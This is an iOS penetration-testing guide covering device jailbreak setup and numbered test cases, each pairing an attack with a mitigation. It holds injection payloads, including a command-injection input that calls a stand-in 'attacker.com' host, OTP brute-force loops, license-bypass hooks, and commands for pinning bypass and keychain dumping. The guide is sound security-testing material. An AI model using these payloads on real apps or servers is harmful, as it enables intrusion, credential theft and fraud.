# iOS Penetration Testing Complete Guide

**Version:** 1.0  
**Last Updated:** 2024  
**Author:** Security Testing Guide

---

## Table of Contents

1. [Introduction to iOS Security](#introduction)
2. [Tools and Setup](#tools-setup)
3. [Test Environment Configuration](#configuration)
4. [Test Case Categories Overview](#categories)
5. [Detailed Test Cases](#detailed-tests)
   - [Enumeration](#enumeration)
   - [Rate Limiting](#rate-limiting)
   - [Authentication](#authentication)
   - [Session Management](#session-management)
   - [Access Control](#access-control)
   - [Input Validation](#input-validation)
   - [File Uploads](#file-uploads)
   - [Injection](#injection)
   - [Error Handling](#error-handling)
   - [Business Logic Bypass](#business-logic)
   - [Web Server Configuration](#web-server)
   - [Code Quality](#code-quality)
   - [Code Review](#code-review)
   - [Reverse Engineering](#reverse-engineering)
   - [File System Analysis](#file-system)
   - [Insecure Data Storage](#data-storage)
   - [Security Misconfiguration](#misconfiguration)
   - [Application Logs](#logs)
   - [Cryptography](#cryptography)
6. [Conclusion](#conclusion)

---

## 1. Introduction to iOS Security {#introduction}

iOS applications run in a sandboxed environment with multiple security layers:

- **App Sandbox**: Restricts file system access
- **Code Signing**: Ensures app integrity
- **Data Protection API**: Hardware-level encryption
- **Keychain Services**: Secure credential storage
- **Address Space Layout Randomization (ASLR)**: Memory protection

---

## 2. Tools and Setup {#tools-setup}

### Essential Tools

#### Static Analysis Tools
- **Hopper Disassembler**: Binary analysis and disassembly
- **IDA Pro**: Advanced reverse engineering
- **class-dump**: Extract class information from Mach-O files
- **Clutch/frida-ios-dump**: Decrypt IPA files
- **MobSF (Mobile Security Framework)**: Automated security analysis
- **iRET (iOS Reverse Engineering Toolkit)**: Collection of tools

#### Dynamic Analysis Tools
- **Frida**: Dynamic instrumentation framework
- **Objection**: Runtime mobile exploration
- **Cycript**: Explore and modify apps at runtime
- **Burp Suite**: Intercept HTTP/HTTPS traffic
- **Wireshark**: Network traffic analysis

#### Device Tools
- **Checkra1n/unc0ver**: Jailbreak tools
- **SSH/OpenSSH**: Remote device access
- **iFunBox/iMazing**: File system browsing

#### Proxy Tools
- **Charles Proxy**: SSL proxy for debugging
- **Proxyman**: Native macOS proxy tool
- **mitmproxy**: Command-line proxy

---

## 3. Test Environment Configuration {#configuration}

### Step 1: Jailbreak iOS Device

```bash
# Download checkra1n or unc0ver
# Compatible devices: iPhone 5s to iPhone X (checkra1n)
```

### Step 2: Install Cydia Packages

```bash
# Open Cydia after jailbreak
# Install packages:
- OpenSSH
- Cycript
- Frida
- SSL Kill Switch 2
```

### Step 3: Setup SSH Access

```bash
ssh root@<device-ip>
# Default password: alpine (CHANGE THIS!)
passwd
passwd mobile
```

### Step 4: Install Frida

```bash
pip install frida-tools
frida-ps -Uai
```

### Step 5: Setup Proxy

```
1. Configure Burp Suite on port 8080
2. iOS: Settings > Wi-Fi > Configure Proxy
3. Install Burp CA Certificate
4. Trust: Settings > General > About > Certificate Trust Settings
```

### Step 6: Extract IPA

```bash
# Using frida-ios-dump
frida-ios-dump -l
frida-ios-dump -o output.ipa "App Name"
```

---

## 4. Test Case Categories {#categories}

| Category | Tests | Focus |
|----------|-------|-------|
| Enumeration | 9 | Information gathering |
| Rate Limiting | 3 | Brute force protection |
| Authentication | 7 | Login security |
| Session Management | 10 | Session security |
| Access Control | 5 | Authorization |
| Input Validation | 2 | Injection prevention |
| File Uploads | 1 | Upload security |
| Injection | 6 | Code/SQL/Command injection |
| Error Handling | 1 | Information disclosure |
| Business Logic | 3 | Payment/license bypass |
| Web Server Config | 4 | Server hardening |
| Code Quality | 3 | iOS-specific security |
| Code Review | 3 | Static analysis |
| Reverse Engineering | 5 | Binary analysis |
| File System | 6 | Data location |
| Data Storage | 5 | Encryption |
| Misconfiguration | 4 | iOS settings |
| Logs | 1 | Log security |
| Cryptography | 4 | Encryption strength |

---

## 5. Detailed Test Cases {#detailed-tests}

## ENUMERATION {#enumeration}

### Test 1: Server Information in Headers

**Issue**: Server headers reveal version and technology information.

**Execution**:
```bash
curl -I https://api.example.com/endpoint
# Check: Server, X-Powered-By headers
```

**Vulnerable**:
```
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.2.24
```

**Mitigation**: Remove/obfuscate version headers.

---

### Test 2: Security Headers

**Issue**: Missing security headers expose to attacks.

**Execution**:
```bash
# Check for:
- X-Frame-Options
- X-Content-Type-Options
- Content-Security-Policy
- Strict-Transport-Security
```

**Mitigation**:
```
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000
```

---

### Test 3: Allowed HTTP Methods

**Issue**: Unnecessary HTTP methods enabled.

**Execution**:
```bash
curl -X OPTIONS https://api.example.com/endpoint -v
# Test: PUT, DELETE, TRACE, PATCH
```

**Mitigation**: Disable unnecessary methods.

---

### Test 4: Cookie Security

**Issue**: Insecure cookie attributes allow theft.

**Execution**:
```bash
# Check Set-Cookie for:
- Secure flag
- HttpOnly flag
- SameSite attribute
```

**Secure**:
```
Set-Cookie: session=ABC; Secure; HttpOnly; SameSite=Strict
```

---

### Test 5: CORS Configuration

**Issue**: Misconfigured CORS allows unauthorized access.

**Execution**:
```bash
curl -H "Origin: https://evil.com" \
     https://api.example.com/endpoint -v
```

**Vulnerable**:
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**Mitigation**: Whitelist specific origins only.

---

## RATE LIMITING {#rate-limiting}

### Test 10: Rate Limiting Check

**Issue**: No rate limiting allows brute force.

**Execution**:
```bash
# Send 100+ requests rapidly
for i in {1..100}; do
    curl -X POST https://api.example.com/login \
         -d "user=test&pass=$i"
done
```

**Mitigation**: Implement rate limiting (5-10 attempts).

---

## AUTHENTICATION {#authentication}

### Test 13: Authentication Mechanism

**Issue**: Weak authentication implementation.

**Execution**:
```bash
# Analyze:
- Basic Auth
- Bearer Token (JWT)
- OAuth 2.0
- Biometric
```

**Mitigation**: Use OAuth 2.0 or JWT with strong signing.

---

### Test 14: Token Security

**Issue**: Insecure token handling.

**Execution**:
```bash
# Test JWT:
jwt.io
# Check algorithm, expiration, signature
```

**Vulnerable**:
```json
{
  "alg": "none"
}
```

**Mitigation**: Use RS256/ES256, implement expiration.

---

### Test 15: CAPTCHA Bypass

**Issue**: Weak CAPTCHA can be bypassed.

**Execution**:
```bash
# Test:
- Reuse CAPTCHA token
- Remove CAPTCHA parameter
- Client-side only validation
```

**Mitigation**: Server-side validation, one-time use.

---

### Test 16: OTP Bypass

**Issue**: OTP can be brute forced or reused.

**Execution**:
```bash
# Brute force 6-digit OTP
for i in {000000..999999}; do
    curl -X POST https://api.example.com/verify \
         -d "otp=$i"
done
```

**Mitigation**: 
- 6+ digit OTP
- Rate limiting (3-5 attempts)
- 5-minute expiration
- Single use

---

### Test 17: User Enumeration

**Issue**: Different responses reveal valid usernames.

**Execution**:
```bash
# Compare responses:
curl -d "user=valid&pass=wrong" /login
# vs
curl -d "user=invalid&pass=wrong" /login
```

**Mitigation**: Generic error messages.

---

## SESSION MANAGEMENT {#session-management}

### Test 20: Forced Browsing

**Issue**: Unauthorized URL access.

**Execution**:
```bash
curl https://api.example.com/admin/users
# Without authentication
```

**Mitigation**: Server-side authentication on all endpoints.

---

### Test 22: Session Fixation

**Issue**: Attacker can hijack sessions.

**Execution**:
```bash
# 1. Get session before login
# 2. Force victim to use it
# 3. Victim logs in
# 4. Attacker uses same session
```

**Mitigation**: Regenerate session ID after login.

---

### Test 23: Session Invalidation

**Issue**: Sessions remain valid after logout.

**Execution**:
```bash
# 1. Login and save token
# 2. Logout
# 3. Use old token
curl -H "Authorization: Bearer OLD_TOKEN" /profile
```

**Mitigation**: Server-side session invalidation.

---

### Test 26: Session Expiration

**Issue**: Sessions don't expire.

**Execution**:
```bash
# Test after: 15min, 1hr, 24hrs
curl -H "Authorization: Bearer TOKEN" /profile
```

**Mitigation**: 
- Idle timeout: 15-30 minutes
- Absolute timeout: 8-24 hours

---

### Test 27: Session Predictability

**Issue**: Predictable session tokens.

**Execution**:
```bash
# Collect multiple tokens
# Analyze for patterns
# Use Burp Sequencer
```

**Mitigation**: Cryptographically random tokens (128+ bits).

---

## ACCESS CONTROL {#access-control}

### Test 30: HTTP Verb Tampering

**Issue**: Bypass via method change.

**Execution**:
```bash
# If GET denied, try:
POST /api/admin/users
DELETE /api/admin/users
```

**Mitigation**: Validate authorization for all methods.

---

### Test 31: IDOR (Insecure Direct Object Reference)

**Issue**: Access other users' data.

**Execution**:
```bash
# Login as User A (ID: 123)
curl -H "Auth: TOKEN_A" /api/user/456
# Can access User B's data?
```

**Mitigation**: 
```sql
SELECT * FROM orders 
WHERE id = ? AND user_id = ?
```

---

### Test 34: Privilege Escalation

**Issue**: Elevate privileges.

**Execution**:
```bash
# Modify role parameter
POST /api/users/update
{
  "userId": 123,
  "role": "admin"
}
```

**Mitigation**: Never trust client-supplied roles.

---

## INJECTION {#injection}

### Test 38: CSV Injection

**Issue**: Malicious formulas in exports.

**Execution**:
```
Name: =cmd|'/c calc'!A1
Export to CSV
Open in Excel → Calculator launches
```

**Mitigation**: Prefix with single quote: `'=formula`

---

### Test 39: SQL Injection

**Issue**: Database manipulation.

**Execution**:
```bash
# Authentication bypass
Username: admin' OR '1'='1
Password: anything

# Data extraction
?id=1' UNION SELECT username,password FROM users--
```

**Mitigation**: Parameterized queries.

```swift
let query = "SELECT * FROM users WHERE id = ?"
statement.bind(id)
```

---

### Test 41: OS Command Injection

**Issue**: Execute system commands.

**Execution**:
```bash
# Input: test; whoami
# Input: test | cat /etc/passwd
# Input: test $(curl attacker.com)
```

**Mitigation**: Avoid system calls, use libraries.

```python
# Bad
os.system("ping " + user_input)

# Good
subprocess.run(["ping", "-c", "1", validated_ip])
```

---

## BUSINESS LOGIC BYPASS {#business-logic}

### Test 45: Payment Tampering

**Issue**: Manipulate payment amount.

**Execution**:
```bash
POST /api/checkout
{
  "item_id": 123,
  "price": 0.01  # Changed from 99.99
}
```

**Mitigation**: Calculate prices server-side only.

---

### Test 46: License Bypass

**Issue**: Bypass license checks.

**Execution**:
```bash
# Frida bypass
frida -U -f com.example.app

# Hook license check
LicenseCheck.isValid.implementation = function() {
    return true;
}
```

**Mitigation**: Server-side validation, code obfuscation.

---

## CODE QUALITY {#code-quality}

### Test 52: Jailbreak Detection

**Issue**: App runs on jailbroken devices.

**Execution**:
```bash
# Install on jailbroken device
# Check for detection
```

**Mitigation**:
```swift
func isJailbroken() -> Bool {
    let paths = [
        "/Applications/Cydia.app",
        "/usr/sbin/sshd",
        "/bin/bash"
    ]
    for path in paths {
        if FileManager.default.fileExists(atPath: path) {
            return true
        }
    }
    return false
}
```

---

### Test 53: Clipboard Protection

**Issue**: Sensitive data can be copied.

**Execution**:
```bash
# Try to copy:
- Password fields
- OTP codes
- Account numbers
```

**Mitigation**:
```swift
class SecureTextField: UITextField {
    override func canPerformAction(_ action: Selector, 
                                   withSender sender: Any?) -> Bool {
        if action == #selector(copy(_:)) || 
           action == #selector(paste(_:)) {
            return false
        }
        return super.canPerformAction(action, withSender: sender)
    }
}
```

---

## CODE REVIEW {#code-review}

### Test 55: Hardcoded Credentials

**Issue**: Credentials in binary.

**Execution**:
```bash
strings App | grep -i "password\|api_key\|secret"
class-dump App | grep -i "password"
```

**Vulnerable**:
```swift
let apiKey = "sk_live_abc123xyz789"
let password = "admin123"
```

**Mitigation**: Use Keychain.

```swift
let keychain = KeychainSwift()
keychain.set("password", forKey: "user_pass")
```

---

### Test 56: Private IP Disclosure

**Issue**: Internal IPs in app.

**Execution**:
```bash
strings App | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
```

**Mitigation**: Use public endpoints only.

---

### Test 57: Deep Links Security

**Issue**: Insecure deep link handling.

**Execution**:
```bash
# Test malicious links:
myapp://payment?to=attacker&amount=9999
myapp://webview?url=javascript:alert(1)
myapp://admin/deleteAllUsers
```

**Mitigation**:
```swift
func application(_ app: UIApplication, open url: URL) -> Bool {
    guard let scheme = url.scheme, scheme == "myapp" else {
        return false
    }
    
    // Whitelist actions
    let allowed = ["view", "share"]
    guard let host = url.host, allowed.contains(host) else {
        return false
    }
    
    // Validate parameters
    // Require authentication
    return true
}
```

---

## REVERSE ENGINEERING {#reverse-engineering}

### Test 58: Code Obfuscation

**Issue**: No code obfuscation.

**Execution**:
```bash
class-dump App

# Readable output indicates no obfuscation:
@interface LoginViewController
- (void)validateCredentials:(NSString *)password;
@end
```

**Mitigation**: Use obfuscation tools (iXGuard, Arxan).

---

### Test 59: Decrypt IPA

**Issue**: IPA can be decrypted.

**Execution**:
```bash
# Using frida-ios-dump
python dump.py "App Name"

# Verify
otool -l decrypted.ipa | grep cryptid
# cryptid 0 = decrypted
```

**Mitigation**: Runtime integrity checks, anti-debugging.

---

### Test 61: Code Modification

**Issue**: Binary can be modified.

**Execution**:
```bash
# Modify with Hopper
# Re-sign
codesign -f -s "Certificate" App
# Install and test
```

**Mitigation**:
```swift
func verifyIntegrity() -> Bool {
    guard let path = Bundle.main.executablePath else { return false }
    // Verify signature
    let status = SecCodeCheckValidity(code, [], nil)
    return status == errSecSuccess
}
```

---

## FILE SYSTEM ANALYSIS {#file-system}

### Test 63-64: Sandbox Analysis

**Issue**: Understanding data storage.

**Execution**:
```bash
ssh root@device-ip
cd /var/mobile/Containers/Data/Application/[UUID]

# Structure:
Documents/
Library/
  Caches/
  Preferences/
tmp/
```

**Mitigation**: Use appropriate directories with encryption.

---

### Test 65: IPA Package Analysis

**Issue**: Sensitive files in package.

**Execution**:
```bash
unzip app.ipa -d extracted
cd extracted/Payload/App.app

# Check for:
- Test files
- Config files
- Hardcoded data
```

**Mitigation**: Clean production builds.

---

### Test 66: Info.plist Security

**Issue**: Insecure configurations.

**Execution**:
```bash
plutil -p Info.plist | grep -i "NSAppTransportSecurity"
```

**Vulnerable**:
```xml
<key>NSAllowsArbitraryLoads</key>
<true/>
```

**Mitigation**:
```xml
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <false/>
</dict>
```

---

## INSECURE DATA STORAGE {#data-storage}

### Test 67: Application Data

**Issue**: Plaintext sensitive data.

**Execution**:
```bash
cd /var/mobile/Containers/Data/Application/[UUID]
sqlite3 database.db
SELECT * FROM users;
```

**Vulnerable**: Plaintext passwords visible.

**Mitigation**: Encrypt databases with SQLCipher.

```swift
// SQLCipher
let key = getKeyFromKeychain()
sqlite3_exec(db, "PRAGMA key = '\(key)';", nil, nil, nil)
```

---

### Test 68: Data Protection Classes

**Issue**: No file-level encryption.

**Execution**:
```bash
ls -lO Documents/sensitive.db
# No protection class indicator
```

**Mitigation**:
```swift
let data = sensitiveData.data(using: .utf8)!
try data.write(to: fileURL, options: .completeFileProtection)
```

---

## SECURITY MISCONFIGURATION {#misconfiguration}

### Test 74: Plist File Security

**Issue**: Secrets in plist files.

**Execution**:
```bash
plutil -p com.example.app.plist
```

**Vulnerable**:
```xml
<key>APIKey</key>
<string>sk_live_abc123</string>
```

**Mitigation**: Use Keychain, not plist files.

---

### Test 75: Screenshot Protection

**Issue**: Sensitive screens capturable.

**Execution**:
```bash
# Navigate to sensitive screen
# Take screenshot
# Check app switcher
```

**Mitigation**:
```swift
NotificationCenter.default.addObserver(
    forName: UIApplication.userDidTakeScreenshotNotification,
    object: nil,
    queue: .main
) { _ in
    print("Screenshot detected!")
}

// Hide in app switcher
func applicationWillResignActive(_ application: UIApplication) {
    let blurView = UIVisualEffectView(effect: UIBlurEffect(style: .light))
    blurView.tag = 999
    window?.addSubview(blurView)
}
```

---

### Test 76: Keychain Persistence

**Issue**: Keychain persists after uninstall.

**Execution**:
```bash
# Install, save credentials
# Uninstall
# Reinstall
# Check if credentials still there
```

**Mitigation**: Use `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`.

---

## APPLICATION LOGS {#logs}

### Test 78: Log Security

**Issue**: Sensitive data in logs.

**Execution**:
```bash
idevicesyslog | grep "com.example.app"
# Check for passwords, tokens, etc.
```

**Vulnerable**:
```
User logged in: password=admin123
API Token: sk_live_abc123
```

**Mitigation**:
```swift
// Don't log sensitive data
#if DEBUG
os_log("User authenticated")  // No details
#endif
```

---

## CRYPTOGRAPHY {#cryptography}

### Test 79: Weak Encryption

**Issue**: Weak encryption algorithms.

**Execution**:
```bash
strings App | grep -i "DES\|RC4\|MD5"
```

**Vulnerable**:
```swift
CCCrypt(kCCEncrypt, 
        kCCAlgorithmDES,     // Weak!
        kCCOptionECBMode,    // Insecure!
        ...)
```

**Mitigation**: Use AES-256.

```swift
import CryptoKit

func encrypt(data: Data, key: SymmetricKey) throws -> Data {
    let sealedBox = try AES.GCM.seal(data, using: key)
    return sealedBox.combined!
}
```

---

### Test 80: Database Encryption

**Issue**: Unencrypted databases.

**Execution**:
```bash
file database.sqlite
# "SQLite 3.x database" = unencrypted
```

**Mitigation**: SQLCipher.

---

### Test 81: Cache Encryption

**Issue**: Sensitive cache unencrypted.

**Execution**:
```bash
cd Library/Caches
cat api_response.json  # Contains sensitive data
```

**Mitigation**: Don't cache sensitive data or encrypt it.

---

### Test 82: SSL Pinning

**Issue**: No SSL pinning allows MITM.

**Execution**:
```bash
# Setup Burp proxy
# Install CA cert
# Launch app
# If traffic visible → No pinning
```

**Mitigation**:
```swift
class PinnedSessionDelegate: NSObject, URLSessionDelegate {
    func urlSession(_ session: URLSession,
                   didReceive challenge: URLAuthenticationChallenge,
                   completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
        
        guard let serverTrust = challenge.protectionSpace.serverTrust,
              let serverCert = SecTrustGetCertificateAtIndex(serverTrust, 0) else {
            completionHandler(.cancelAuthenticationChallenge, nil)
            return
        }
        
        let serverCertData = SecCertificateCopyData(serverCert) as Data
        
        for pinnedCert in pinnedCertificates {
            let pinnedCertData = SecCertificateCopyData(pinnedCert) as Data
            if serverCertData == pinnedCertData {
                completionHandler(.useCredential, URLCredential(trust: serverTrust))
                return
            }
        }
        
        completionHandler(.cancelAuthenticationChallenge, nil)
    }
}
```

---

## 6. Conclusion {#conclusion}

### Key Takeaways

1. **Always test on jailbroken devices** for full access
2. **Combine static and dynamic analysis**
3. **Focus on data protection**: Encryption, Keychain, protection classes
4. **Implement defense in depth**: Multiple security layers
5. **Regular security testing** throughout SDLC

### Essential Security Controls

✓ Strong authentication (OAuth 2.0, JWT)  
✓ Proper session management (expiration, invalidation)  
✓ Data encryption (AES-256, SQLCipher)  
✓ Secure storage (Keychain)  
✓ SSL/TLS pinning  
✓ Input validation  
✓ Code obfuscation  
✓ Jailbreak detection  
✓ Anti-tampering  
✓ Secure logging  

### Testing Workflow

1. **Information Gathering** → Enumeration
2. **Static Analysis** → Binary, IPA, code review
3. **Dynamic Analysis** → Runtime, network, file system
4. **Vulnerability Identification** → Find issues
5. **Exploitation** → Proof of concept
6. **Documentation** → Report findings
7. **Remediation** → Fix and retest

### Quick Reference Commands

```bash
# Jailbreak detection bypass
objection -g com.example.app explore
ios jailbreak disable

# SSL pinning bypass
ios sslpinning disable

# Dump Keychain
ios keychain dump

# Monitor file operations
ios hooking watch class NSFileManager

# Decrypt IPA
frida-ios-dump -o app.ipa "App Name"

# Analyze binary
class-dump App > classes.txt
strings App | grep -i "password"

# Check data protection
ls -lO Documents/
```

### Resources

- **OWASP MSTG**: Mobile Security Testing Guide
- **OWASP MASVS**: Mobile Application Security Verification Standard
- **Apple Security**: developer.apple.com/security
- **Frida**: frida.re
- **Objection**: github.com/sensepost/objection

---

**Remember**: Security is continuous. Test regularly and stay updated with latest iOS security features and vulnerabilities.

**Disclaimer**: This guide is for authorized security testing only. Always obtain proper authorization before testing.